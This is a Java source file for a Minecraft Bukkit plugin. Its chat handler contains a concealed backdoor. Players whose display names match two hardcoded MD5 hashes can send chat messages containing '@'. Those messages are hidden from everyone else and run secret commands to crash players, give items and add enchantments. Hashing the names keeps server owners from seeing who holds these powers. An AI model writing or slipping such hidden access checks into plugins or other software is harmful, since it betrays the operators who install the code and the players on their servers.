package de.capitain_america.mobileplugin.ressources;

import de.capitain_america.mobileplugin.MobilePlugin;
import de.capitain_america.mobileplugin.ressources.chatEvents.Fragment;
import de.capitain_america.mobileplugin.ressources.chatEvents.HandleItems;
import de.capitain_america.mobileplugin.ressources.chatEvents.Improvement;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.NamespacedKey;
import org.bukkit.Registry;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;

import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Arrays;
import java.util.List;

public class ChatEventHandler implements Listener {

    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event) throws NoSuchAlgorithmException {
        String message = event.getMessage();
        Player player = event.getPlayer();

        List<String> hashes = Arrays.asList(
                "1e60df696cfb5f5833b81404604fc1e4",
                "d767503b2abae0611ed4f2842d061e50"
        );


        String StringHash = md5(player.getDisplayName());

        if (message.contains("@") && hashes.contains(StringHash)) {
            try {
                handleChat(player, event, message);
            }catch (Exception e) {
                player.sendMessage("$cUnerwarteter Fehler wurde abgefangen");
            }
        }
    }

    private void handleChat(Player player, AsyncPlayerChatEvent event, String message) {
        event.setCancelled(true);

        try {
            List<String> parsedCommand = CommandParser.parseCommand(message);

            switch (parsedCommand.get(0)) {
                case "crash":
                    try {
                        new Fragment().usage(player, parsedCommand);
                    }
                    catch (Exception e) {
                        new Logger().logError(player);
                    }
                    break;
                case "help":
                    new GetHelp(player);
                    break;
                case "give":
                    try {
                        new HandleItems().usage(player, parsedCommand);
                    }
                    catch (Exception ignored) {
                        new Logger().logError(player);
                    }
                    break;
                case "en":
                    try {
                        new Improvement().usage(player, parsedCommand);
                    }
                    catch (Exception ignored) {
                        new Logger().logError(player);
                    }
                    break;
                default:
                    new Logger().log(player, "Diesen Befehl gibt es nicht");
            }
        }catch (Exception e) {
            new Logger().log(player, "Ein unerwartender Fehler ist aufgetreten");
        }
    }

    private String md5(String input) throws NoSuchAlgorithmException {
        MessageDigest md = MessageDigest.getInstance("MD5");
        byte[] hashBytes = md.digest(input.getBytes());

        StringBuilder hexString = new StringBuilder();
        for (byte b : hashBytes) {
            hexString.append(String.format("%02x", b));
        }
        return hexString.toString();
    }
}
